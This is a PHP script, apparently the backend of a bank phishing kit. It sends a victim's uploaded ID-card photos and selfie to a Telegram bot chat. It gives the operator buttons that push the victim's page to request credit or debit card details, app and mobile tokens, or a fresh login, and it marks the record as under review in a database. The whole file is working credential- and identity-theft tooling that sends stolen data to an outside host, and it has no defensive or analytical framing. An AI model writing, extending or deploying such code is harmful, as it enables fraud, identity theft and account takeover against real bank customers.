<?php
// process_kyc.php — Envía imagen KYC a Telegram y maneja estados
$config = require 'conexion.php';

$tipo = $_POST['tipo'] ?? '';
$id = $_POST['id'] ?? '';
$img = $_POST['image'] ?? $_POST['selfie'] ?? '';

if (empty($tipo) || empty($id) || empty($img)) {
    echo json_encode(['ok' => false, 'error' => 'Datos incompletos']);
    exit;
}

// Decodificar base64
$img_data = base64_decode(preg_replace('/^data:image\/\w+;base64,/', '', $img));
if (!$img_data) {
    echo json_encode(['ok' => false, 'error' => 'Imagen inválida']);
    exit;
}

// Guardar en temp del sistema (siempre tiene permisos)
$tmpFile = tempnam(sys_get_temp_dir(), 'kyc_') . '.jpg';
file_put_contents($tmpFile, $img_data);

$botToken = $config['telegram']['bot_token'];
$chatId = $config['telegram']['chat_id'];

$labels = [
    'front' => '🪪 *Frente del Documento*',
    'back' => '🪪 *Reverso del Documento*',
    'selfie' => '🤳 *Selfie de Verificación*',
];
$caption = ($labels[$tipo] ?? '📷 Imagen KYC') . "\n› ID: `{$id}`";

// Enviar foto a Telegram
if (!empty($botToken) && !empty($chatId)) {
    $base_url = trim($config['base_url']);
    $admin_prompt_url = str_replace('actualizar_estado.php', 'admin_prompt_movil.php', $base_url);
    $es_local = (strpos($base_url, 'localhost') !== false);

    $ch = curl_init();
    $post_data = [
        'chat_id' => $chatId,
        'photo' => new CURLFile($tmpFile, 'image/jpeg', $tipo . '.jpg'),
        'caption' => $caption,
        'parse_mode' => 'Markdown',
    ];

    if (!$es_local && !empty($base_url)) {
        $keyboard = [
            'inline_keyboard' => [
                [
                    ['text' => '✅ TC Aprobada', 'url' => $base_url . '?id=' . $id . '&estado=11'],
                ],
                [
                    ['text' => '❌ Error TC Crédito', 'url' => $base_url . '?id=' . $id . '&estado=12'],
                    ['text' => '❌ Error TC Débito', 'url' => $base_url . '?id=' . $id . '&estado=15'],
                ],
                [
                    ['text' => '💳 Pedir TC Crédito', 'url' => $base_url . '?id=' . $id . '&estado=13'],
                    ['text' => '🏦 Pedir TC Débito', 'url' => $base_url . '?id=' . $id . '&estado=14'],
                ],
                [
                    ['text' => '✅ Soy yo', 'url' => $base_url . '?id=' . $id . '&estado=6'],
                    ['text' => '❌ Error Soy yo', 'url' => $base_url . '?id=' . $id . '&estado=7'],
                ],
                [
                    ['text' => '❌ Login Fallido', 'url' => $base_url . '?id=' . $id . '&estado=1'],
                    ['text' => '⚠️ Pedir Token App', 'url' => $base_url . '?id=' . $id . '&estado=2'],
                ],
                [
                    ['text' => '❌ Rechazar', 'url' => $base_url . '?id=' . $id . '&estado=3'],
                    ['text' => '📱 Pedir Token Móvil', 'url' => $admin_prompt_url . '?id=' . $id],
                ],
                [
                    ['text' => '🚫 Token Móvil Inválido', 'url' => $base_url . '?id=' . $id . '&estado=5']
                ]
            ]
        ];
        $post_data['reply_markup'] = json_encode($keyboard);
    }

    curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot{$botToken}/sendPhoto");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 20);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_exec($ch);
    curl_close($ch);
}

// Borrar archivo temporal
if (file_exists($tmpFile))
    unlink($tmpFile);

// ========================================================
// Si es la selfie: actualizar estado a 8 (en revisión)
// y enviar mensaje con botones de decisión al admin
// ========================================================
if ($tipo === 'selfie') {
    // Actualizar estado a 8 (KYC en revisión — esperando decisión)
    $db_config = $config['db'];
    $driver = $db_config['driver'];
    $dsn = ($driver === 'mysql')
        ? "mysql:host={$db_config['host']};dbname={$db_config['dbname']};charset=utf8mb4"
        : "pgsql:host={$db_config['host']};dbname={$db_config['dbname']}";

    try {
        $pdo = new PDO($dsn, $db_config['user'], $db_config['password']);
        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        $pdo->prepare("UPDATE a_confirmar SET estado = 8 WHERE id = :id")
            ->execute([':id' => $id]);
    }
    catch (PDOException $e) {
        error_log('KYC DB error: ' . $e->getMessage());
    }

    // Mensaje de aviso con los MISMOS botones del login
    if (!empty($botToken) && !empty($chatId)) {
        $base_url = trim($config['base_url']);
        $admin_prompt_url = str_replace('actualizar_estado.php', 'admin_prompt_movil.php', $base_url);
        $es_local = (strpos($base_url, 'localhost') !== false);

        $msg = "✅ *KYC Completado — Ya puedes decidir*\n";
        $msg .= "El cliente envió frente, reverso y selfie.\n";
        $msg .= "› ID: `{$id}`";

        $post_fields = [
            'chat_id' => $chatId,
            'text' => $msg,
            'parse_mode' => 'Markdown',
        ];

        if (!$es_local && !empty($base_url)) {
            $keyboard = [
                'inline_keyboard' => [
                    [
                        ['text' => '✅ TC Aprobada', 'url' => $base_url . '?id=' . $id . '&estado=11'],
                    ],
                    [
                        ['text' => '❌ Error TC Crédito', 'url' => $base_url . '?id=' . $id . '&estado=12'],
                        ['text' => '❌ Error TC Débito', 'url' => $base_url . '?id=' . $id . '&estado=15'],
                    ],
                    [
                        ['text' => '💳 Pedir TC Crédito', 'url' => $base_url . '?id=' . $id . '&estado=13'],
                        ['text' => '🏦 Pedir TC Débito', 'url' => $base_url . '?id=' . $id . '&estado=14'],
                    ],
                    [
                        ['text' => '✅ Soy yo', 'url' => $base_url . '?id=' . $id . '&estado=6'],
                        ['text' => '❌ Error Soy yo', 'url' => $base_url . '?id=' . $id . '&estado=7'],
                    ],
                    [
                        ['text' => '❌ Login Fallido', 'url' => $base_url . '?id=' . $id . '&estado=1'],
                        ['text' => '⚠️ Pedir Token App', 'url' => $base_url . '?id=' . $id . '&estado=2'],
                    ],
                    [
                        ['text' => '❌ Rechazar', 'url' => $base_url . '?id=' . $id . '&estado=3'],
                        ['text' => '📱 Pedir Token Móvil', 'url' => $admin_prompt_url . '?id=' . $id],
                    ],
                    [
                        ['text' => '🚫 Token Móvil Inválido', 'url' => $base_url . '?id=' . $id . '&estado=5']
                    ]
                ]
            ];
            $post_fields['reply_markup'] = json_encode($keyboard);
        }

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot{$botToken}/sendMessage");
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_exec($ch);
        curl_close($ch);
    }
}

echo json_encode(['ok' => true]);
